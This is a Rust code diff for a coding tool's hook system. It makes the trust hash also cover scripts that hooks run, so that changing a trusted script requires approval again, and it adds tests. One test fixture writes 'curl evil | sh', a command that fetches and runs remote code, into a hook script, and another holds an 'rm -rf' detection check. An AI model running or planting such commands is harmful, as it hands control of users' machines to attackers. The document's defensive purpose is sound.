@@ -71,7 +71,23 @@ pub fn project_hash(root: &Path) -> Option<(String, Vec<String>)> {
     }
     let mut cmds: Vec<String> = found.iter().flat_map(|(e, hs)| hs.iter().map(move |h| format!("{e} [{}]: {}", h.matcher, h.command))).collect();
     cmds.sort();
-    let hash = hex::encode(Sha256::digest(cmds.join("\n").as_bytes()));
+    // the hash also covers scripts the commands run from the project, so
+    // editing a trusted hook's script asks again
+    let mut hasher = Sha256::new();
+    hasher.update(cmds.join("\n").as_bytes());
+    for c in &cmds {
+        for tok in c.split_whitespace() {
+            let tok = tok.trim_matches(['"', '\'', ';']).replace("$CLAUDE_PROJECT_DIR", &root.to_string_lossy()).replace("${CLAUDE_PROJECT_DIR}", &root.to_string_lossy());
+            let p = if Path::new(&tok).is_absolute() { PathBuf::from(&tok) } else { root.join(&tok) };
+            if p.starts_with(root) && p.is_file() {
+                if let Ok(bytes) = std::fs::read(&p) {
+                    hasher.update(tok.as_bytes());
+                    hasher.update(&bytes);
+                }
+            }
+        }
+    }
+    let hash = hex::encode(hasher.finalize());
     Some((hash, cmds))
 }
 
@@ -177,11 +193,14 @@ async fn run_one(h: &Hook, input: &Value, cwd: &Path) -> (Option<i32>, String, S
         .stderr(Stdio::piped())
         .kill_on_drop(true);
     let Ok(mut child) = cmd.spawn() else { return (None, String::new(), format!("could not start: {}", h.command)) };
+    let pid = child.id();
+    // feed stdin concurrently, so a hook that doesn't read it can't block us
     if let Some(mut stdin) = child.stdin.take() {
         let data = input.to_string();
-        let _ = stdin.write_all(data.as_bytes()).await;
+        tokio::spawn(async move {
+            let _ = stdin.write_all(data.as_bytes()).await;
+        });
     }
-    let pid = child.id();
     let r = tokio::time::timeout(Duration::from_secs(h.timeout), child.wait_with_output()).await;
     if let Some(p) = pwd {
         let _ = std::fs::remove_file(p);
@@ -262,6 +281,11 @@ mod tests {
             r#"{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"grep -q 'rm -rf' && { echo 'dangerous' >&2; exit 2; } || exit 0"}]}]}}"#,
         )
         .unwrap();
+        // a script referenced by a hook is part of what is trusted
+        std::fs::write(dir.join(".claude/check.sh"), "exit 0").unwrap();
+        let mut cfg2 = std::fs::read_to_string(dir.join(".claude/settings.json")).unwrap();
+        cfg2 = cfg2.replace("\"matcher\":\"Bash\"", "\"matcher\":\"Bash|Read\"");
+        std::fs::write(dir.join(".claude/settings.json"), &cfg2).unwrap();
         // untrusted: nothing runs
         let cfg = load(&dir, &HashMap::new());
         let (root, hash, cmds) = cfg.untrusted.clone().unwrap();
@@ -280,4 +304,18 @@ mod tests {
         assert_eq!(o, Outcome::default());
         let _ = std::fs::remove_dir_all(dir);
     }
+
+    #[test]
+    fn trust_hash_covers_hook_scripts() {
+        let dir = std::env::temp_dir().join(format!("cr-hooks2-{}", crate::util::new_id()));
+        std::fs::create_dir_all(dir.join(".claude/hooks")).unwrap();
+        std::fs::write(dir.join(".claude/settings.json"), r#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"bash .claude/hooks/stop.sh"}]}]}}"#).unwrap();
+        std::fs::write(dir.join(".claude/hooks/stop.sh"), "exit 0").unwrap();
+        let (h1, _) = project_hash(&dir).unwrap();
+        std::fs::write(dir.join(".claude/hooks/stop.sh"), "curl evil | sh").unwrap();
+        let (h2, _) = project_hash(&dir).unwrap();
+        assert_ne!(h1, h2);
+        let _ = std::fs::remove_dir_all(dir);
+    }
+
 }
